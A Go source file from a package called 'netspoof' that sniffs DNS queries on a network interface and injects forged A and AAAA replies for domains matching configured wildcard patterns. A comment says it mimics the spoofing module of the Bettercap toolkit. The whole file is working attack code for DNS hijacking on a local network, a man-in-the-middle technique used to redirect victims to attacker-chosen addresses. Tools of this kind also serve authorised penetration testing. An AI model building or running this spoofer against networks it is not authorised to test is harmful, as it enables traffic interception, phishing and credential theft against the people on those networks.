package netspoof

import (
	"context"
	"fmt"
	"net"
	"net/netip"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

const dnsTTL = 1024

// RunDNS listens for UDP/53 queries and replies with spoofed A/AAAA records
// for any domain matched by sess.DNSDomains.
func RunDNS(ctx context.Context, sess *Session) error {
	if !sess.DNSAddress.IsValid() {
		return fmt.Errorf("dns: -dns-address is required")
	}
	if len(sess.DNSDomains) == 0 {
		return fmt.Errorf("dns: no domains configured (-dns-domains or -dns)")
	}

	handle, err := OpenPacketHandle(sess.IfaceName, true)
	if err != nil {
		return fmt.Errorf("dns: packet handle open: %w", err)
	}
	defer handle.Close()
	sess.TrackHandle(handle)

	fmt.Printf("[dns] started: address=%s rules=%d\n", sess.DNSAddress, len(sess.DNSDomains))
	for _, r := range sess.DNSDomains {
		fmt.Printf("[dns]   %s -> %s\n", r.Pattern, r.Address)
	}

	src := gopacket.NewPacketSource(handle, layers.LinkTypeEthernet)
	packets := src.Packets()

	for {
		select {
		case <-ctx.Done():
			return nil
		case pkt, ok := <-packets:
			if !ok || pkt == nil {
				continue
			}
			handleDNSPacket(sess, pkt)
		}
	}
}

func handleDNSPacket(sess *Session, pkt gopacket.Packet) {
	ethL := pkt.Layer(layers.LayerTypeEthernet)
	udpL := pkt.Layer(layers.LayerTypeUDP)
	dnsL := pkt.Layer(layers.LayerTypeDNS)
	if ethL == nil || udpL == nil || dnsL == nil {
		return
	}
	eth := ethL.(*layers.Ethernet)
	udp := udpL.(*layers.UDP)
	dns := dnsL.(*layers.DNS)

	// queries only
	if dns.QR || len(dns.Questions) == 0 {
		return
	}

	// figure out which IP the client sent to (that becomes our src IP)
	var clientIP, serverIP net.IP
	var ipv6 bool
	if l := pkt.Layer(layers.LayerTypeIPv4); l != nil {
		ip4 := l.(*layers.IPv4)
		clientIP, serverIP = ip4.SrcIP, ip4.DstIP
	} else if l := pkt.Layer(layers.LayerTypeIPv6); l != nil {
		ip6 := l.(*layers.IPv6)
		clientIP, serverIP = ip6.SrcIP, ip6.DstIP
		ipv6 = true
	} else {
		return
	}

	// Match questions. Answer each matched question in one packet.
	var answers []layers.DNSResourceRecord
	matchedAny := false

	for _, q := range dns.Questions {
		name := strings.TrimSuffix(strings.ToLower(string(q.Name)), ".")
		addr, ok := matchDNS(sess.DNSDomains, name)
		if !ok {
			continue
		}
		matchedAny = true

		switch q.Type {
		case layers.DNSTypeA:
			if addr.Is4() {
				answers = append(answers, layers.DNSResourceRecord{
					Name:  q.Name,
					Type:  layers.DNSTypeA,
					Class: layers.DNSClassIN,
					TTL:   dnsTTL,
					IP:    net.IP(addr.AsSlice()),
				})
			}
		case layers.DNSTypeAAAA:
			// Match Bettercap: embed the IPv4 into an AAAA record.
			ip4 := addr.As4()
			ip6 := make(net.IP, 16)
			ip6[10] = 0xff
			ip6[11] = 0xff
			copy(ip6[12:], ip4[:])
			answers = append(answers, layers.DNSResourceRecord{
				Name:  q.Name,
				Type:  layers.DNSTypeAAAA,
				Class: layers.DNSClassIN,
				TTL:   dnsTTL,
				IP:    ip6,
			})
		default:
			// ignore MX/TXT/etc.
		}
	}

	if !matchedAny || len(answers) == 0 {
		return
	}

	reply := &layers.DNS{
		ID:           dns.ID,
		QR:           true,
		OpCode:       layers.DNSOpCodeQuery,
		RD:           dns.RD,
		ResponseCode: layers.DNSResponseCodeNoErr,
		Questions:    dns.Questions,
		Answers:      answers,
	}
	fmt.Printf("[dns] query from %s -> %s: %s\n",
		clientIP, serverIP, string(dns.Questions[0].Name))
	raw, err := serializeDNSReply(reply, eth.DstMAC, eth.SrcMAC, serverIP, clientIP, udp.DstPort, udp.SrcPort, ipv6)
	if err != nil {
		return
	}
	fmt.Printf("[dns] replying with %s\n", sess.DNSAddress)

	_ = sess.Tx.Send(raw)
}

func serializeDNSReply(dns *layers.DNS, srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP, srcPort, dstPort layers.UDPPort, ipv6 bool) ([]byte, error) {
	udp := layers.UDP{SrcPort: srcPort, DstPort: dstPort}
	eth := layers.Ethernet{SrcMAC: srcMAC, DstMAC: dstMAC}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}

	if ipv6 {
		eth.EthernetType = layers.EthernetTypeIPv6
		ip6 := layers.IPv6{
			Version:    6,
			NextHeader: layers.IPProtocolUDP,
			HopLimit:   64,
			SrcIP:      srcIP,
			DstIP:      dstIP,
		}
		udp.SetNetworkLayerForChecksum(&ip6)
		if err := gopacket.SerializeLayers(buf, opts, &eth, &ip6, &udp, dns); err != nil {
			return nil, err
		}
	} else {
		eth.EthernetType = layers.EthernetTypeIPv4
		ip4 := layers.IPv4{
			Version:  4,
			TTL:      64,
			Protocol: layers.IPProtocolUDP,
			SrcIP:    srcIP,
			DstIP:    dstIP,
		}
		udp.SetNetworkLayerForChecksum(&ip4)
		if err := gopacket.SerializeLayers(buf, opts, &eth, &ip4, &udp, dns); err != nil {
			return nil, err
		}
	}
	return buf.Bytes(), nil
}

// --- matching ---

func matchDNS(rules []DNSRule, host string) (netip.Addr, bool) {
	for _, r := range rules {
		if wildcardMatch(r.Pattern, host) {
			return r.Address, true
		}
	}
	return netip.Addr{}, false
}

func wildcardMatch(pattern, host string) bool {
	if !strings.Contains(pattern, "*") {
		return pattern == host
	}
	parts := strings.Split(pattern, "*")
	// "*" alone matches everything
	if len(parts) == 2 && parts[0] == "" && parts[1] == "" {
		return true
	}
	if !strings.HasPrefix(host, parts[0]) {
		return false
	}
	if !strings.HasSuffix(host, parts[len(parts)-1]) {
		return false
	}
	pos := len(parts[0])
	for _, mid := range parts[1 : len(parts)-1] {
		idx := strings.Index(host[pos:], mid)
		if idx < 0 {
			return false
		}
		pos += idx + len(mid)
	}
	return true
}

// keep time import used by callers
var _ = time.Second
